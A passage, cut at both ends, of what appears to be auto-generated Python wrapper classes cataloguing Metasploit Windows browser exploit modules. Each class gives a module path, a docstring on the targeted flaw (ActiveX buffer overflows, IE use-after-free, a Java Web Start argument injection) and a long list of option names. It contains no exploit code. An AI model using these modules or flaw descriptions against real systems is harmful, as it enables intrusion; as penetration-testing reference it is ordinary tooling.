			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			PlaylistSpaceInjection = 'PlaylistSpaceInjection'

	class windows_browser_chilkat_crypt_writefile(object):
		"""
		
          This module allows attackers to execute code via the 'WriteFile' unsafe method of
        Chilkat Software Inc's Crypt ActiveX control.

        This exploit is based on shinnai's exploit that uses an hcp:// protocol URI to
        execute our payload immediately. However, this method requires that the victim user
        be browsing with Administrator. Additionally, this method will not work on newer
        versions of Windows.

        NOTE: This vulnerability is still unpatched. The latest version of Chilkat Crypt at
        the time of this writing includes ChilkatCrypt2.DLL version 4.4.4.0.
      
		"""

		path = 'windows/browser/chilkat_crypt_writefile'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_ms07_017_ani_loadimage_chunksize(object):
		"""
		
          This module exploits a buffer overflow vulnerability in the
        LoadAniIcon() function in USER32.dll. The flaw can be triggered through
        Internet Explorer 6 and 7 by using the CURSOR style sheet directive
        to load a malicious .ANI file. The module can also exploit Mozilla
        Firefox by using a UNC path in a moz-icon URL and serving the .ANI file
        over WebDAV. The vulnerable code in USER32.dll will catch any
        exceptions that occur while the invalid cursor is loaded, causing the
        exploit to silently fail when the wrong target has been chosen.

        This vulnerability was discovered by Alexander Sotirov of Determina
        and was rediscovered, in the wild, by McAfee.
      
		"""

		path = 'windows/browser/ms07_017_ani_loadimage_chunksize'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_hpmqc_progcolor(object):
		"""
		
        This module exploits a stack-based buffer overflow in SPIDERLib.Loader
        ActiveX control (Spider90.ocx) 9.1.0.4353 installed by TestDirector (TD)
        for Hewlett-Packard Mercury Quality Center 9.0 before Patch 12.1, and
        8.2 SP1 before Patch 32.
        By setting an overly long value to 'ProgColor', an attacker can overrun
        a buffer and execute arbitrary code.
      
		"""

		path = 'windows/browser/hpmqc_progcolor'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms10_018_ie_behaviors(object):
		"""
		
          This module exploits a use-after-free vulnerability within the DHTML behaviors
        functionality of Microsoft Internet Explorer versions 6 and 7. This bug was
        discovered being used in-the-wild and was previously known as the "iepeers"
        vulnerability. The name comes from Microsoft's suggested workaround to block
        access to the iepeers.dll file.

        According to Nico Waisman, "The bug itself is when trying to persist an object
        using the setAttribute, which end up calling VariantChangeTypeEx with both the
        source and the destination being the same variant. So if you send as a variant
        an IDISPATCH the algorithm will try to do a VariantClear of the destination before
        using it. This will end up on a call to PlainRelease which deref the reference
        and clean the object."

        NOTE: Internet Explorer 8 and Internet Explorer 5 are not affected.
      
		"""

		path = 'windows/browser/ms10_018_ie_behaviors'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_x360_video_player_set_text_bof(object):
		"""
		
        This module exploits a buffer overflow in the VideoPlayer.ocx ActiveX installed with the
        X360 Software. By setting an overly long value to 'ConvertFile()',an attacker can overrun
        a .data buffer to bypass ASLR/DEP and finally execute arbitrary code.
      
		"""

		path = 'windows/browser/x360_video_player_set_text_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_nctaudiofile2_setformatlikesample(object):
		"""
		
          This module exploits a stack buffer overflow in the NCTAudioFile2.Audio ActiveX
        Control provided by various audio applications. By sending an overly long
        string to the "SetFormatLikeSample()" method, an attacker may be able to
        execute arbitrary code.
      
		"""

		path = 'windows/browser/nctaudiofile2_setformatlikesample'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_browser_ms11_093_ole32(object):
		"""
		
          This module exploits a type confusion vulnerability in the OLE32 component of
        Windows XP SP3. The vulnerability exists in the CPropertyStorage::ReadMultiple
        function.

        A Visio document with a specially crafted Summary Information Stream embedded allows
        to get remote code execution through Internet Explorer, on systems with Visio Viewer
        installed.
      
		"""

		path = 'windows/browser/ms11_093_ole32'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_adobe_flatedecode_predictor02(object):
		"""
		
          This module exploits an integer overflow vulnerability in Adobe Reader and Adobe
        Acrobat Professional versions before 9.2.
      
		"""

		path = 'windows/browser/adobe_flatedecode_predictor02'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_clear_quest_cqole(object):
		"""
		
          This module exploits a function prototype mismatch on the CQOle ActiveX
        control in IBM Rational ClearQuest < 7.1.1.9, < 7.1.2.6 or < 8.0.0.2 which
        allows reliable remote code execution when DEP isn't enabled.
      
		"""

		path = 'windows/browser/clear_quest_cqole'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_adobe_utilprintf(object):
		"""
		
          This module exploits a buffer overflow in Adobe Reader and Adobe Acrobat Professional
        < 8.1.3. By creating a specially crafted pdf that a contains malformed util.printf()
        entry, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/adobe_utilprintf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_adobe_shockwave_rcsl_corruption(object):
		"""
		
          This module exploits a weakness in the Adobe Shockwave player's handling of
        Director movies (.DIR). A memory corruption vulnerability occurs through an undocumented
        rcsL chunk.
      
		"""

		path = 'windows/browser/adobe_shockwave_rcsl_corruption'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_java_ws_double_quote(object):
		"""
		
          This module exploits a flaw in the Web Start component of the Sun Java
        Runtime Environment. Parameters intial-heap-size and max-heap-size in a JNLP
        file can contain a double quote which is not properly sanitized when creating
        the command line for javaw.exe. This allows the injection of the -XXaltjvm
        option to load a jvm.dll from a remote UNC path into the java process. Thus
        an attacker can execute arbitrary code in the context of a browser user.
        This flaw was fixed in Oct. 2012 and affects JRE <= 1.6.35 and <= 1.7.07.

        In order for this module to work, it must be run as root on a server that
        does not serve SMB (In most cases, this means non-Windows hosts). Additionally,
        the target host must have the WebClient service (WebDAV Mini-Redirector) enabled.
        Alternatively, a UNC path containing a jvm.dll can be specified, bypassing
        the Windows limitation for the Metasploit host.
      
		"""

		path = 'windows/browser/java_ws_double_quote'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			UNCPATH = 'UNCPATH'

	class windows_browser_webex_ucf_newobject(object):
		"""
		
          This module exploits a stack-based buffer overflow in WebEx's WebexUCFObject
        ActiveX Control. If an long string is passed to the 'NewObject' method, a stack-
        based buffer overflow will occur when copying attacker-supplied data using the
        sprintf function.

        It is noteworthy that this vulnerability was discovered and reported by multiple
        independent researchers. To quote iDefense's advisory, "Before this issue was
        publicly reported, at least three independent security researchers had knowledge
        of this issue; thus, it is reasonable to believe that even more people were aware
        of this issue before disclosure."

        NOTE: Due to input restrictions, this exploit uses a heap-spray to get the payload
        into memory unmodified.
      
		"""

		path = 'windows/browser/webex_ucf_newobject'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_browser_ms08_041_snapshotviewer(object):
		"""
		
          This module allows remote attackers to place arbitrary files on a users file system
        via the Microsoft Office Snapshot Viewer ActiveX Control.
      
		"""

		path = 'windows/browser/ms08_041_snapshotviewer'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_PATH = 'PATH'

	class windows_browser_macrovision_downloadandexecute(object):
		"""
		
          This module exploits a stack buffer overflow in Macrovision InstallShield Update
        Service(Isusweb.dll 6.0.100.54472). By passing an overly long ProductCode string to
        the DownloadAndExecute method, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/macrovision_downloadandexecute'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_maxthon_history_xcs(object):
		"""
		
        Cross Context Scripting (XCS) is possible in the Maxthon about:history page.
        Injection in such privileged/trusted browser zone can be used to modify
        configuration settings and execute arbitrary commands.

        Please note this module only works against specific versions of XCS. Currently,
        we've only successfully tested on Maxthon 3.1.7 build 600 up to 3.2.2 build 1000.
      
		"""

		path = 'windows/browser/maxthon_history_xcs'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_ms06_067_keyframe(object):
		"""
		
        This module exploits a heap overflow vulnerability in the KeyFrame method of the
        direct animation ActiveX control.  This is a port of the exploit implemented by
        Alexander Sotirov.
      
		"""

		path = 'windows/browser/ms06_067_keyframe'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_baofeng_storm_onbeforevideodownload(object):
		"""
		
          This module exploits a buffer overflow in BaoFeng's Storm media Player ActiveX
        control. Verions of mps.dll including 3.9.4.27 and lower are affected. When passing
        an overly long string to the method "OnBeforeVideoDownload" an attacker can execute
        arbitrary code.
      
		"""

		path = 'windows/browser/baofeng_storm_onbeforevideodownload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_vlc_amv(object):
		"""
		
          This module exploits VLC media player when handling a .AMV file. By flipping
        the 0x41st byte in the file format (video width/height), VLC crashes due to an
        invalid pointer, which allows remote attackers to gain arbitrary code execution.
        The vulnerable packages include: VLC 1.1.4, VLC 1.1.5, VLC 1.1.6, VLC 1.1.7. Also,
        please note that IE 8 targets require Java support in order to run properly.
        
		"""

		path = 'windows/browser/vlc_amv'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
